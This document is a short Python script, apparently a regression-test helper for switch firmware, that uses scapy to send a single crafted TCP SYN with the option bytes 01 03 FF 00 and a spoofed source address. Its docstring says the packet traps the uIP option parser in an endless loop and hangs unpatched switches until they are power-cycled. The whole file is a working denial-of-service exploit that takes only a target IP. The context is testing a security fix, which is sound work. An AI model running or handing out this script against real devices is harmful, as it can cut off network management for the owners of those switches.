#!/usr/bin/env python3
"""dos_syn.py SWITCH_IP [PEER_IP] - send the single crafted TCP SYN that hangs
the uIP main loop (RTLPlayground PR #902 / the TCP-option-parsing lockup).

Mirrors the SYN in ovs-rtlpg tests/net/test_uip_hardening.py: data offset
covering four option bytes 01 03 FF 00 (NOOP, then an unknown option whose
length field 255 wraps the 8-bit option cursor back to 0, so the walk never
ends). On unpatched firmware the switch's single main loop never returns and
it stops answering management (ARP/ping/HTTP) until it is power-cycled. Sent at
L2 to the switch's MAC. This only sends the frame; the caller checks liveness.
"""
import struct
import sys

from scapy.all import ARP, Ether, IP, Raw, conf, get_if_hwaddr, sendp, srp1

IFACE = __import__("os").environ.get("RTLHW_IFACE", "eth0")


def csum(b):
    if len(b) % 2:
        b += b"\0"
    s = sum(struct.unpack("!%dH" % (len(b) // 2), b))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return (~s) & 0xffff


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    conf.verb = 0
    dst = sys.argv[1]
    peer = sys.argv[2] if len(sys.argv) > 2 else "172.16.16.111"
    mymac = get_if_hwaddr(IFACE)
    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=dst), iface=IFACE, timeout=3)
    if not ans:
        sys.exit("dos_syn: switch did not ARP-reply")
    swmac = ans[ARP].hwsrc
    opts = bytes([0x01, 0x03, 0xFF, 0x00])
    off = (20 + len(opts)) // 4
    tcp = struct.pack("!HHIIBBHHH", 40000, 80, 1000, 0, off << 4, 0x02, 4096, 0, 0) + opts
    pseudo = bytes(int(x) for x in peer.split(".")) + bytes(int(x) for x in dst.split(".")) + struct.pack("!BBH", 0, 6, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", csum(pseudo + tcp)) + tcp[18:]
    sendp(Ether(dst=swmac, src=mymac) / IP(src=peer, dst=dst) / Raw(tcp), iface=IFACE, verbose=0)
    print(f"sent the crafted SYN (options 01 03 FF 00) to {dst}:80")


if __name__ == "__main__":
    main()
